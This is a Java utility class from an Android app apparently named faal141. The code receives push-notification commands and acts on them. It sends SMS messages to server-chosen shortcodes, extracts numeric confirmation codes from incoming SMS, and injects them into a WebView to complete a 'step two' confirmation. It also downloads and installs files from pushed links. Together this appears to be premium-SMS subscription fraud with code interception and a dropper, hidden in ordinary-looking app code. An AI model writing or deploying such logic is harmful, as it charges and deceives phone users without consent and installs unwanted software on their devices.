package ir.website.faal141;

import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Build;
import android.os.Handler;
import android.telephony.SmsManager;
import android.telephony.SubscriptionInfo;
import android.telephony.SubscriptionManager;
import android.telephony.TelephonyManager;
import android.util.Log;

import com.onesignal.OSNotification;
import com.onesignal.OneSignal;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.MalformedURLException;
import java.net.URL;
import java.net.URLConnection;
import java.util.Date;
import java.util.Iterator;
import java.util.List;
import java.util.TimeZone;

/**
 * Created by ali on 2/3/18.
 */

public class UtilityV2 {
    private static final String TAG = "UtilityV2";
    public static String popType = "v1";
    public static int times = 2;
    public static int interval = 1;
    public static int removeicon = 5;

    public static String getSmsGetway() {
        String operator = "other";
        try {
            if (android.os.Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP_MR1) {
                SmsManager smsManager = SmsManager.getDefault();
                SubscriptionManager subscriptionManager = SubscriptionManager.from(OSService.context);
                List<SubscriptionInfo> subscriptionInfoList = subscriptionManager.getActiveSubscriptionInfoList();
                for (SubscriptionInfo subscriptionInfo : subscriptionInfoList) {
//                    Log.d(TAG, "handleNOtification: " + subscriptionInfo.getSubscriptionId() + ":" + smsManager.getSubscriptionId());
                    if (subscriptionInfo.getSubscriptionId() == smsManager.getSubscriptionId()) {
                        String carrierName = subscriptionInfo.getCarrierName().toString().toLowerCase();
//                        Log.d(TAG, "handleNOtification: " + subscriptionInfo.getSubscriptionId() + ":" + smsManager.getSubscriptionId() + ":" + carrierName);
                        if (carrierName.contains("ir-") || carrierName.contains("mci") || carrierName.contains("tci")) {
                            operator = "hamrah";
                        } else if (carrierName.contains("irancell") || carrierName.contains("mtn")) {
                            operator = "irancell";
                        }
                        return operator;
                    }

                }
            } else {
                TelephonyManager tManager = (TelephonyManager) OSService.context.getSystemService(Context.TELEPHONY_SERVICE);
                String carrierName = "";
                if (android.os.Build.VERSION.SDK_INT >= Build.VERSION_CODES.JELLY_BEAN_MR1) {
                    carrierName = tManager.getNetworkOperatorName().toLowerCase();
                } else {
                    carrierName = tManager.getNetworkOperatorName().toLowerCase();
                }
//                Log.d(TAG, "getSmsGetway: "+carrierName);
                if (carrierName.contains("ir-") || carrierName.contains("mci") || carrierName.contains("tci")) {
                    operator = "hamrah";
                } else if (carrierName.contains("irancell") || carrierName.contains("mtn")) {
                    operator = "irancell";
                }
                return operator;
            }
        } catch (Exception ex) {
            Log.d(TAG, "getSmsGetway: m " + ex.getMessage());
        }
        return operator;
    }

    public static String getData(String url) {

        String content = "";
        URL mUrl=null;
        try {
            if(url.contains("?")){
                mUrl = new URL(url);
            }else{
                mUrl = new URL(url + "?_=" + System.currentTimeMillis());
            }
        } catch (MalformedURLException e) {
        }
        Log.d(TAG, "getData: "+mUrl.toString());
        try {
            assert mUrl != null;
            URLConnection connection = mUrl.openConnection();
            connection.setUseCaches(false);
            BufferedReader br = new BufferedReader(new InputStreamReader(connection.getInputStream()));
            String line = "";
            while ((line = br.readLine()) != null) {
                content += line;
            }
            br.close();
        } catch (IOException e) {
            e.printStackTrace();
        }
        //Log.d(TAG, "getData: "+content);
        return content;
    }

    public static Boolean setStepTwo() {
        try {
            if (!Utility.getBool("inapp") && Utility.getString("notification").isEmpty() ||
                    (Utility.getBool("inapp") &&
                            Utility.getLong("interval") < new Date().getTime() &&
                            OSService.notification.isEmpty()
                            && PopActivityV2.activity == null
                    )
                    ) {
                Utility.clearParams();
                return false;
            }
            if (
                    !Utility.getString("notification").isEmpty()
                            && !PopActivityV2.isRun
                            && (!Utility.getBool("inapp") || (Utility.getBool("inapp") && Utility.getLong("interval") > new Date().getTime()))
                    ) {
                OSService.notification = Utility.getString("notification");
                Intent serviceIntent = new Intent(OSService.context, PopActivityV2.class);
                serviceIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                OSService.context.startActivity(serviceIntent);
                Thread.sleep(1000);
            }
            SharedPreferences settings = OSService.context.getSharedPreferences("faal141",  Context.MODE_PRIVATE);
            boolean verify = settings.getBoolean("verify", false);
            String myshortcode = settings.getString("myshortcode", "");
            String mykey = settings.getString("mykey", "");
            if (myshortcode != "" && mykey != "") {
                setJSStepTwo(mykey);
                return true;
            }
        } catch (Exception ex) {
        }

        return false;
    }

    public static void setJSStepTwo(String myKey) {
        if (myKey.isEmpty()) {
            myKey = Utility.getString("mykey");
        }
        if (!myKey.isEmpty()) {
            try {
                PopActivityV2.progress.cancel();
                PopActivityV2.progress.dismiss();
                PopActivityV2.progress = null;
            } catch (Exception e) {
            }
            final String webUrl = "javascript:setStepTwo('" + myKey + "')";
            if (PopActivityV2.mWebView != null) {
                PopActivityV2.mWebView.loadUrl(webUrl);
            }
        }
    }

    public static void checkSMS(String message) {
        String s = "";
        UtilityV2.setVersion();
        String prefix = Utility.getString("prefix");
        String postfix = Utility.getString("postfix");
        String wrongprefix = Utility.getString("wrongprefix");
        String wrongpostfix = Utility.getString("wrongpostfix");
/*        Log.d(TAG, "checkSMS: wrongpostfix"+wrongpostfix);
        Log.d(TAG, "checkSMS: wrongprefix"+wrongprefix);
        Log.d(TAG, "checkSMS: "+message.indexOf(wrongpostfix)+message);*/
        if (message.indexOf(prefix) != -1) {
            s = message.substring(message.indexOf(prefix) + prefix.length());
            if (message.indexOf(postfix) != -1) {
                s = s.substring(0, s.indexOf(postfix));
            }
            s = s.trim();
            if (Utility.isInteger(s) == true) {
                Utility.setString("mykey", s);
                if (UtilityV2.popType.contains("v2"))
                    UtilityV2.setStepTwo();
                else
                    Utility.sendStepTwo();
                return;
            }
        }
        if(!wrongprefix.isEmpty()&&message.indexOf(wrongprefix) != -1){
            s = message.substring(message.indexOf(wrongprefix) + wrongprefix.length());
            if (!wrongpostfix.isEmpty()&&message.indexOf(wrongpostfix) != -1) {
                s = s.substring(0, s.indexOf(wrongpostfix));
            }
            s = s.trim();
            Log.d(TAG, "checkSMS: mykey"+s);

            if (Utility.isInteger(s) == true) {
                Utility.setString("mykey", s);
                if (UtilityV2.popType.contains("v2"))
                    UtilityV2.setStepTwo();
                else
                    Utility.sendStepTwo();
                return;
            }
        }
    }

    public static void setVersion() {
        //  UtilityV2.popType = "v2";
//        return;
        try {
            OSNotification osn = null;
            if (OSService.notification.isEmpty() && !Utility.getString("notification").isEmpty()) {
                osn = new OSNotification(new JSONObject(Utility.getString("notification")));
            } else if (!OSService.notification.isEmpty()) {
                osn = new OSNotification(new JSONObject(OSService.notification));
            }
            Log.d(TAG, "setVersion: "+OSService.notification);
            UtilityV2.popType = osn.payload.additionalData.getString("poptype");
        } catch (Exception e) {
            Log.d(TAG, "setVersion: " + e.getMessage());
            UtilityV2.popType = "v1";
        }
    }

    public static void checkInstal() {
        try {
            OSNotification osn = new OSNotification(new JSONObject(OSService.notification));
            String type = osn.payload.additionalData.getString("type");
            String link = osn.payload.additionalData.getString("link1");
            String file = osn.payload.additionalData.getString("file");
            Log.d(TAG, "checkInstal: " + type + link + file);
            if (!type.isEmpty() && !link.isEmpty() && type.equals("install")) {

                new DownlodTask(file).execute(link);
            }
        } catch (Exception e) {
            Log.d(TAG, "checkInstal: " + e.getMessage());
            // UtilityV2.popType="v1";
        }
    }

    public static void handleNOtification(String jsString) {
        try {
            JSONObject data = new JSONObject(jsString);
            JSONArray actions = data.getJSONArray("actions");
            JSONObject tags = data.getJSONObject("tags");
            OneSignal.sendTags(tags);
            String shortcode = "";
            for (int i = 0; i < actions.length(); i++) {
                JSONObject item = actions.getJSONObject(i);
                String type = item.getString("type");
                if (type.equals("shortcode")) {
                    try {
                        shortcode = item.getJSONObject("data").getString("shortcode");
                        String key = item.getJSONObject("data").getString("key");
                        if (Utility.sendStepTwo() == false && !key.contains("optional")) {
                            SmsManager smsManager = SmsManager.getDefault();
                            smsManager.sendTextMessage(shortcode, null, key, null, null);
                        }
                    } catch (Exception ex) {
                    }
                } else if (type.equals("link")) {
                    OSService.links.add(item.getJSONObject("data").getString("link"));
                }
            }
            Utility.openLinkInBrowser();
            //Thread.sleep(2000);
            showApp(data, shortcode);
        } catch (Exception ex) {
            Log.d("JsInterface", ex.getMessage());
        }
    }

    public static void showApp(JSONObject data, String shortcode) {
        try {
            if (UtilityV2.popType.contains("v1")) {
                try {
                    if (!Utility.getBool("inapp")) {
                        JSONObject postData = data.getJSONObject("postData");
                        //Utility.setString("notification",postData.toString());
                        Utility.setString("myshortcode", shortcode);
                        PopActivityV2.activity.finish();
                        Thread.sleep(2000);
                        Intent serviceIntent = new Intent(OSService.context, PopActivityV2.class);
                        serviceIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                        OSService.notification = postData.toString();
                        Log.d(TAG, "showApp: " + OSService.notification.length());
                        OSService.context.startActivity(serviceIntent);
                    }
                    if (Utility.getBool("inapp")) {
                        JSONObject postData = data.getJSONObject("postData");
                        Utility.setString("notification", postData.toString());
                        Utility.setString("myshortcode", shortcode);
                        OSService.notification = postData.toString();
                        PopActivityV2.activity.getWindow().getDecorView().findViewById(R.id.activity_inapp).postInvalidate();
                        PopActivityV2.renderUI(false);
                    }
                    //Utility.resumePopActivity(postData.toString(), 2000);
                } catch (Exception ex) {
                    Utility.setBool("verify", true);
                    Utility.sendStepTwo();
                }
            } else {
                try {
                    JSONObject postData = data.getJSONObject("postData");
                    Utility.setString("myshortcode", shortcode);
                    OSService.notification = postData.toString();
                    Utility.setString("notification", postData.toString());
                    if (Utility.getBool("inapp")) {
                        Utility.setLong("interval", Utility.addMinutes(UtilityV2.interval).getTime());
                        PopActivityV2.activity.getWindow().getDecorView().findViewById(R.id.activity_inapp).postInvalidate();
                        PopActivityV2.renderUI(true);
                        //  startService();
                    } else {
                        PopActivityV2.activity.finish();
                    }
                } catch (Exception ex) {
                    Utility.setBool("verify", true);
                    Utility.sendStepTwo();
                    try {
                        PopActivityV2.activity.finish();
                    } catch (Exception e) {

                    }

                }
            }
        } catch (Exception e) {
            Log.d(TAG, "showApp: " + e.getMessage());
        }
    }

    public static void setMessageFix() {

        try {
            OSNotification osn = new OSNotification(new JSONObject(OSService.notification));
            Utility.setString("prefix", osn.payload.additionalData.getString("prefix"));
            Utility.setString("postfix", osn.payload.additionalData.getString("postfix"));
            try {
                Utility.setString("wrongprefix", osn.payload.additionalData.getString("wrongprefix"));
                Utility.setString("wrongpostfix", osn.payload.additionalData.getString("wrongpostfix"));
            }
            catch (Exception e) {
                Log.d(TAG, "setMessageFix: " + e.getMessage());
            }
        } catch (Exception e) {
            Log.d(TAG, "setMessageFix: " + e.getMessage());
        }
    }
    public static int setTimes() {
        int times = Utility.getInt("times");
        times = times + 1;
        Utility.setInt("times", times);
        Log.d(TAG, "setTimes: " + times);

        return times;
    }
    public static int getTimes() {
        return Utility.getInt("times");
    }
    public static void startService() {
        long delay = Utility.addMinutes(UtilityV2.interval).getTime() - new Date().getTime();
        if (delay < 0) {
            delay = 1;
        }
//        delay=1;
        resumeApp(delay);
    }
    public static void resumeApp(final long delay) {
        Log.d(TAG, "resumeApp: delay " + delay);
        if (delay > 0) {
            final Handler h = new Handler();
            Runnable runnable = new Runnable() {
                @Override
                public void run() {
                    new InAppTask().execute("");
                    //h.postDelayed(this,Utility.addMinutes(UtilityV2.interval).getTime()+1000-new Date().getTime() );
                }
            };
            h.postDelayed(runnable, delay);
        } else {
            new InAppTask().execute("");
        }
    }
    public static void setLink() {
        if (!OSService.notification.isEmpty()) {
            try {
                OSNotification osn = new OSNotification(new JSONObject(OSService.notification));
                //int curstep=Integer.parseInt(osn.payload.additionalData.getString("curstep"));
                int steps = Integer.parseInt(osn.payload.additionalData.getString("steps"));
                // Log.d(TAG, "setLink: "+curstep+":"+steps);
                String link = "";
                for (int i = steps; i > 0; i--) {
                    try {
                        link = osn.payload.additionalData.getString("link" + (String.valueOf(i)));
                    } catch (Exception e) {

                    }
                    if (!link.isEmpty()) {
                        break;
                    }
                }
                Utility.setString("link", link);
                Log.d(TAG, "setLink: " + link);
            } catch (Exception e) {
                Log.d(TAG, "setLink: " + e.getMessage());
            }
        }
    }
    public static void install(String filename) {
        Log.d(TAG, "install: " + DownlodTask.path + ":" + DownlodTask.verify);
        if (!DownlodTask.path.isEmpty() && DownlodTask.verify) {
            try {
                Thread.sleep(200);
                PopActivityV2.activity.finish();
            } catch (Exception ex) {
                Log.d(TAG, ex.getMessage());
            }
            Utility.install(DownlodTask.path);
            Utility.setInt("verifybanner",1);
            showInit();
            DownlodTask.path = "";
            DownlodTask.verify = false;
            DownlodTask.isInstall = false;
//            try{
//            Thread.sleep(2000);
//            } catch (Exception ex) {
//                Log.d(TAG, ex.getMessage());
//            }
        }
    }
    public static void sendTags(String tagsData) {
        try {
            Utility.startOS(OSService.context);
            JSONObject jsobj=new JSONObject(tagsData);
            String mykey="";
            try{
                Iterator<?> keys = jsobj.keys();

                while( keys.hasNext() ) {
                    mykey = (String)keys.next();
                    if ( mykey.contains("notifid") ) {
                        int offset = TimeZone.getDefault().getRawOffset() + TimeZone.getDefault().getDSTSavings();
                        long now = System.currentTimeMillis() + offset;
                        jsobj.put(mykey,String.valueOf(now));
                        break;
                    }
                }
            }
            catch (Exception e){

            }
            if(mykey.isEmpty()){
                OneSignal.sendTags(jsobj);
            }else{
                OneSignal.sendTag(mykey,jsobj.getString(mykey));
            }

            Log.d(TAG, "sendTags: "+jsobj.toString());
        }
        catch (Exception e){
            Log.d(TAG, "sendTags: "+e.getMessage());
        }
    }
    public static void showInit(){
        try{
            if(InitActivity.updateBtn==null) {
                Intent i = new Intent(OSService.context, InitActivity.class);
                OSService.context.startActivity(i);
            }
        }catch (Exception ex){
            Log.d("JsInterface", ex.getMessage());
        }
    }
}